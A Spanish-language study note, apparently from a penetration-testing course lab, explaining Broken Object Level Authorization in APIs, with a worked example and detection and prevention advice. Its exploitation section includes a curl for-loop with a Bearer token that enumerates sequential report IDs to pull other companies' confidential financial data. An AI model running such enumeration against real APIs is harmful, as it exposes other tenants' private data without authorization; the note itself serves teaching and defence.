---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - API
  - IDOR
Descripción: "BOLA (Broken Object Level Authorization) es el IDOR de las APIs y el riesgo nº1 del OWASP API Top 10"
Fecha de actualización: 2026-07-15
Nota previa: "[[00 - Introducción a las API Attacks]]"
Nota siguiente: "[[02 - Broken Authentication (API2)]]"
Area: "[[API Attacks.base|API Attacks]]"
---
---

`BOLA` (Broken Object Level Authorization) es el <mark style="background: #ADCCFFA6;">[[06 - Introducción a IDOR|IDOR]] de las APIs</mark> y el riesgo **nº1** del OWASP API Top 10. Un endpoint es vulnerable si sus comprobaciones de autorización no verifican correctamente que el usuario autenticado tiene permiso sobre el **objeto concreto** que pide. Aquí se materializa como `CWE-639: Authorization Bypass Through User-Controlled Key`.

# Escenario

Credenciales de supplier: `htbpentester1@pentestercompany.com`. Nos autenticamos en `/api/v1/authentication/suppliers/sign-in` y obtenemos un `JWT`, que cargamos en Swagger (botón **Authorize**) o mandamos como `Authorization: Bearer <JWT>`.

Primero nos situamos: ¿quiénes somos y qué podemos hacer?

```text
GET /api/v1/suppliers/current-user      → companyID: b75a7c76-e149-4ca7-9c55-d9fc4ffa87be (Guid)
GET /api/v1/roles/current-user          → role: SupplierCompanies_GetYearlyReportByID
```

Nuestro rol autoriza el endpoint `/api/v1/supplier-companies/yearly-reports/{ID}`. <mark style="background: #FFB8EBA6;">El detalle clave: acepta `ID` como **entero**, no como el `Guid` que identifica a las compañías</mark>. Un entero secuencial es trivialmente enumerable.

# Explotación

Pedimos el reporte con `ID=1`:

```json
{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon!..."
  }
}
```

El `companyID` devuelto (`f9e58492...`) **no** es el nuestro (`b75a7c76...`). <mark style="background: #FF5582A6;">Estamos leyendo el reporte financiero de otra compañía</mark> → BOLA confirmado. El backend valida que tenemos el rol, pero **no** que el objeto pertenezca a nuestra empresa.

## Abuso masivo

Como el `ID` es un entero, un bucle exfiltra todos los reportes (revenue y comentarios confidenciales del C-level de cada compañía):

```shell-session
$ for ((i=1; i<=20; i++)); do
    curl -s -w "\n" -X GET \
      "http://TARGET/api/v1/supplier-companies/yearly-reports/$i" \
      -H 'accept: application/json' \
      -H "Authorization: Bearer $JWT" | jq
  done
```

Truco: copiamos el `curl` que **Swagger genera** por nosotros y solo añadimos el bucle, `-w "\n"`, `-s` y el pipe a `jq`. <mark style="background: #8000E1A6;">La segregación multi-tenant se cae con un for-loop</mark>.

# Detección y prevención

- **Detección**: el tell clásico es un identificador **entero y predecible** donde el resto del sistema usa `Guid`/`UUID`. Compara el objeto devuelto (su `companyID`/`ownerID`) con **tu** identidad: si no coinciden, es BOLA. La forma sistemática es la [[12 - Detección, evasión y prevención de IDOR|metodología de dos cuentas]] con [[13 - Herramientas para IDOR|Autorize/Auth Analyzer]], idéntica al IDOR web.
- **Prevención**: el endpoint debe comparar, **a nivel de código**, el `companyID` del reporte con el `companyID` del supplier autenticado (extraído de la sesión/JWT, no de la petición). Solo si coinciden se concede acceso. Esto mantiene la segregación entre tenants.

> [!warning]+ BOLA vs BFLA
> No confundas: **BOLA** (API1) es acceder a un **objeto** ajeno teniendo el permiso de función; **[[05 - Broken Function Level Authorization (API5)|BFLA]]** (API5) es invocar una **función/rol** que no te corresponde. Aquí teníamos el rol correcto pero lo aplicamos a objetos ajenos → BOLA. El detalle de qué controlas (objeto vs operación) determina la categoría y el CWE.

Siguiente riesgo: [[02 - Broken Authentication (API2)|Broken Authentication]].

## Referencias

- OWASP — [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- MITRE — [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- HTB Academy — *API Attacks* (base, 2024)
